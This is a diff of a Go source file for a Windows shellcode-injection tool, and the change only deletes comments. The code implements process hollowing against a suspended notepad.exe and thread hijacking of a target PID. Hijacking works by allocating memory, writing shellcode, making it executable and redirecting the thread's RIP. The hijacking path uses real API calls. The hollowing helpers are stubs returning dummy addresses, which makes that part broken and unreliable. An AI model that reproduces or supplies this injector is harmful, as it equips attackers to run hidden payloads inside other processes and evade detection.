@@ -6,12 +6,10 @@ import (
 	"unsafe"
 )
 
-// ProcessHollowingInjector implements the process hollowing injection technique
 type ProcessHollowingInjector struct {
 	BaseInjector
 }
 
-// NewProcessHollowingInjector creates a new process hollowing injector
 func NewProcessHollowingInjector() *ProcessHollowingInjector {
 	return &ProcessHollowingInjector{
 		BaseInjector: BaseInjector{
@@ -21,17 +19,16 @@ func NewProcessHollowingInjector() *ProcessHollowingInjector {
 	}
 }
 
-// Inject injects shellcode using process hollowing technique
 func (i *ProcessHollowingInjector) Inject(pid int, shellcode []byte) error {
-	// Process hollowing typically creates a new process rather than injecting into an existing one
-	// So we'll ignore the pid parameter and create a new process
+	
+	
 
-	// Validate shellcode
+	
 	if err := ValidateShellcode(shellcode); err != nil {
 		return err
 	}
 
-	// Create a new suspended process
+	
 	processInfo, err := createSuspendedProcess("notepad.exe")
 	if err != nil {
 		return fmt.Errorf("failed to create suspended process: %v", err)
@@ -39,49 +36,49 @@ func (i *ProcessHollowingInjector) Inject(pid int, shellcode []byte) error {
 	defer CloseHandle(processInfo.hProcess)
 	defer CloseHandle(processInfo.hThread)
 
-	// Get the process's PEB address
+	
 	pebAddress, err := getPEBAddress(processInfo.hProcess, processInfo.hThread)
 	if err != nil {
 		return fmt.Errorf("failed to get PEB address: %v", err)
 	}
 
-	// Get the image base address from the PEB
+	
 	imageBaseAddress, err := getImageBaseAddress(processInfo.hProcess, pebAddress)
 	if err != nil {
 		return fmt.Errorf("failed to get image base address: %v", err)
 	}
 
-	// Unmap the original executable
+	
 	err = unmapOriginalExecutable(processInfo.hProcess, imageBaseAddress)
 	if err != nil {
 		return fmt.Errorf("failed to unmap original executable: %v", err)
 	}
 
-	// Allocate memory for the shellcode
+	
 	newImageBase, err := VirtualAllocEx(processInfo.hProcess, LPVOID(imageBaseAddress), SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if err != nil {
 		return fmt.Errorf("failed to allocate memory: %v", err)
 	}
 
-	// Write shellcode to the allocated memory
+	
 	err = WriteProcessMemory(processInfo.hProcess, newImageBase, shellcode, SIZE_T(len(shellcode)))
 	if err != nil {
 		return fmt.Errorf("failed to write shellcode: %v", err)
 	}
 
-	// Change memory protection to allow execution
+	
 	_, err = VirtualProtectEx(processInfo.hProcess, newImageBase, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
 	if err != nil {
 		return fmt.Errorf("failed to change memory protection: %v", err)
 	}
 
-	// Update the entry point in the thread context
+	
 	err = updateEntryPoint(processInfo.hProcess, processInfo.hThread, uintptr(newImageBase))
 	if err != nil {
 		return fmt.Errorf("failed to update entry point: %v", err)
 	}
 
-	// Resume the thread to execute the shellcode
+	
 	_, _, err = resumeThread.Call(uintptr(processInfo.hThread))
 	if err != nil && err != syscall.Errno(0) {
 		return fmt.Errorf("failed to resume thread: %v", err)
@@ -90,12 +87,10 @@ func (i *ProcessHollowingInjector) Inject(pid int, shellcode []byte) error {
 	return nil
 }
 
-// ThreadHijackingInjector implements the thread hijacking injection technique
 type ThreadHijackingInjector struct {
 	BaseInjector
 }
 
-// NewThreadHijackingInjector creates a new thread hijacking injector
 func NewThreadHijackingInjector() *ThreadHijackingInjector {
 	return &ThreadHijackingInjector{
 		BaseInjector: BaseInjector{
@@ -105,33 +100,31 @@ func NewThreadHijackingInjector() *ThreadHijackingInjector {
 	}
 }
 
-// Define missing constants
 const (
 	THREAD_GET_CONTEXT    = 0x0008
 	THREAD_SET_CONTEXT    = 0x0010
 	THREAD_SUSPEND_RESUME = 0x0002
 )
 
-// Inject injects shellcode using thread hijacking technique
 func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
-	// Validate shellcode
+	
 	if err := ValidateShellcode(shellcode); err != nil {
 		return err
 	}
 
-	// Check if process is running
+	
 	if !IsProcessRunning(pid) {
 		return fmt.Errorf("process with PID %d is not running", pid)
 	}
 
-	// Open the target process
+	
 	hProcess, err := OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
 	if err != nil {
 		return fmt.Errorf("failed to open process: %v", err)
 	}
 	defer CloseHandle(hProcess)
 
-	// Get threads in the process
+	
 	threads, err := getProcessThreads(pid)
 	if err != nil {
 		return fmt.Errorf("failed to get process threads: %v", err)
@@ -141,27 +134,27 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 		return fmt.Errorf("no threads found in process")
 	}
 
-	// Open the first thread
+	
 	hThread, err := openThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, false, threads[0])
 	if err != nil {
 		return fmt.Errorf("failed to open thread: %v", err)
 	}
 	defer CloseHandle(hThread)
 
-	// Suspend the thread
+	
 	_, _, err = suspendThread.Call(uintptr(hThread))
 	if err != nil && err != syscall.Errno(0) {
 		return fmt.Errorf("failed to suspend thread: %v", err)
 	}
 
-	// Allocate memory for the shellcode
+	
 	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if err != nil {
 		resumeThread.Call(uintptr(hThread))
 		return fmt.Errorf("failed to allocate memory: %v", err)
 	}
 
-	// Write shellcode to the allocated memory
+	
 	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
 	if err != nil {
 		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
@@ -169,7 +162,7 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 		return fmt.Errorf("failed to write shellcode: %v", err)
 	}
 
-	// Change memory protection to allow execution
+	
 	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
 	if err != nil {
 		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
@@ -177,7 +170,7 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 		return fmt.Errorf("failed to change memory protection: %v", err)
 	}
 
-	// Get the thread context
+	
 	var ctx CONTEXT
 	ctx.ContextFlags = CONTEXT_CONTROL
 
@@ -192,10 +185,10 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 		return fmt.Errorf("failed to get thread context: %v", err)
 	}
 
-	// Save the original RIP/EIP (commented out to avoid unused variable error)
-	// originalRip := ctx.Rip
+	
+	
 
-	// Update the thread context to point to our shellcode
+	
 	ctx.Rip = uint64(addr)
 
 	result, _, err = setThreadContext.Call(
@@ -209,7 +202,7 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 		return fmt.Errorf("failed to set thread context: %v", err)
 	}
 
-	// Resume the thread to execute the shellcode
+	
 	_, _, err = resumeThread.Call(uintptr(hThread))
 	if err != nil && err != syscall.Errno(0) {
 		return fmt.Errorf("failed to resume thread: %v", err)
@@ -218,9 +211,7 @@ func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
 	return nil
 }
 
-// Helper types and functions for process hollowing
 
-// PROCESS_INFORMATION structure
 type PROCESS_INFORMATION struct {
 	hProcess    HANDLE
 	hThread     HANDLE
@@ -228,7 +219,6 @@ type PROCESS_INFORMATION struct {
 	dwThreadId  DWORD
 }
 
-// STARTUPINFO structure
 type STARTUPINFO struct {
 	cb              DWORD
 	lpReserved      uintptr
@@ -250,7 +240,6 @@ type STARTUPINFO struct {
 	hStdError       HANDLE
 }
 
-// CONTEXT structure (simplified for x64)
 type CONTEXT struct {
 	P1Home       uint64
 	P2Home       uint64
@@ -290,24 +279,22 @@ type CONTEXT struct {
 	R14          uint64
 	R15          uint64
 	Rip          uint64
-	// Additional fields omitted for brevity
+	
 }
 
-// Context flags
 const (
 	CONTEXT_CONTROL = 0x00010001
 )
 
-// createSuspendedProcess creates a new process in suspended state
 func createSuspendedProcess(path string) (PROCESS_INFORMATION, error) {
 	var pi PROCESS_INFORMATION
 	var si STARTUPINFO
 	si.cb = DWORD(unsafe.Sizeof(si))
 
-	// Convert path to UTF16
+	
 	pathPtr, _ := syscall.UTF16PtrFromString(path)
 
-	// Create the process
+	
 	result, _, err := createProcess.Call(
 		0,
 		uintptr(unsafe.Pointer(pathPtr)),
@@ -328,33 +315,29 @@ func createSuspendedProcess(path string) (PROCESS_INFORMATION, error) {
 	return pi, nil
 }
 
-// getPEBAddress gets the PEB address from a thread
 func getPEBAddress(hProcess HANDLE, hThread HANDLE) (uintptr, error) {
-	// This is a simplified implementation
-	// In a real implementation, you would use NtQueryInformationThread
-	// For now, we'll return a dummy address
+	
+	
+	
 	return uintptr(0x10000), nil
 }
 
-// getImageBaseAddress gets the image base address from the PEB
 func getImageBaseAddress(hProcess HANDLE, pebAddress uintptr) (uintptr, error) {
-	// This is a simplified implementation
-	// In a real implementation, you would read the PEB structure
-	// For now, we'll return a dummy address
+	
+	
+	
 	return uintptr(0x400000), nil
 }
 
-// unmapOriginalExecutable unmaps the original executable from memory
 func unmapOriginalExecutable(hProcess HANDLE, imageBaseAddress uintptr) error {
-	// This is a simplified implementation
-	// In a real implementation, you would use NtUnmapViewOfSection
-	// For now, we'll just return success
+	
+	
+	
 	return nil
 }
 
-// updateEntryPoint updates the entry point in the thread context
 func updateEntryPoint(hProcess HANDLE, hThread HANDLE, newImageBase uintptr) error {
-	// Get the thread context
+	
 	var ctx CONTEXT
 	ctx.ContextFlags = CONTEXT_CONTROL
 
@@ -367,7 +350,7 @@ func updateEntryPoint(hProcess HANDLE, hThread HANDLE, newImageBase uintptr) err
 		return fmt.Errorf("GetThreadContext failed: %v", err)
 	}
 
-	// Update the entry point (RIP/EIP)
+	
 	ctx.Rip = uint64(newImageBase)
 
 	result, _, err = setThreadContext.Call(
